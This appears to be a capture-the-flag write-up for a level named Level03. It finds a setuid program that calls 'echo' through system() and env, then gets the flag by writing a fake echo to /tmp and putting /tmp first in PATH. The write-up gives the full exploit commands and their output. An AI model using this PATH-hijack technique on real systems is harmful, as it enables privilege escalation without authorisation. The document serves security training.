# Level03

## Exploring the computer

```bash 
$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

```bash 
$ file level03
executable with setuid and setgid active
```
```bash 
$ ./level03
Exploit me
```

## Learning more about the executable 

```bash
$ ltrace ./level03 
[...]
system("/usr/bin/env echo Exploit me"Exploit me)
[...]
```

We see that the executable calls the echo function with system.
I did a previous CTF where we had to change the PATH to have a custom echo command, we will do the same here.

## Implementing our own echo command

```bash
$ echo "/bin/sh -c 'getflag'" > /tmp/echo
$ chmod 755 /tmp/echo
```

```bash
$ export PATH=/tmp:$PATH
```

We create and add our own echo to PATH to overwrite the standard  

I make sure that tmp has been added to the path :
`
```bash
$ which echo 
/tmp/echo
```
Okay our echo has taken over the 'normal' one

## Getting the flag

```bash
$ ./level03 
Check flag.Here is your token : ******************
```
